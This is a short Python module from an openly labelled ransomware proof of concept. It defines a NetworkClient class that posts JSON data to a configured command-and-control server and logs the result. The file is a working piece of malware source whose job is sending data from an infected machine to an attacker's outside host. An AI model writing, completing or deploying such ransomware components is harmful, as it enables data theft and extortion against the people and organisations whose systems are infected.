# Networking logic for ransomware PoC
import requests
from ransomware.config import AppConfig
from ransomware.logging import logger
from ransomware.exceptions import NetworkError

class NetworkClient:
    """
    Handles communication with the C2 server using HTTP requests.
    """
    def __init__(self, config: AppConfig):
        """
        Initialize the NetworkClient with configuration.
        """
        self.base_url = config.c2_server_url
        self.timeout = config.timeout

    def send_data(self, endpoint: str, data: dict) -> dict:
        """
        Send data to the C2 server at the specified endpoint.
        Raises NetworkError on failure.
        """
        url = f"{self.base_url}/{endpoint}"
        try:
            response = requests.post(url, json=data, timeout=self.timeout)
            response.raise_for_status()
            logger.info(f"Data sent to {url}")
            return response.json()
        except requests.RequestException as e:
            logger.error(f"Network error: {e}")
            raise NetworkError(str(e)) 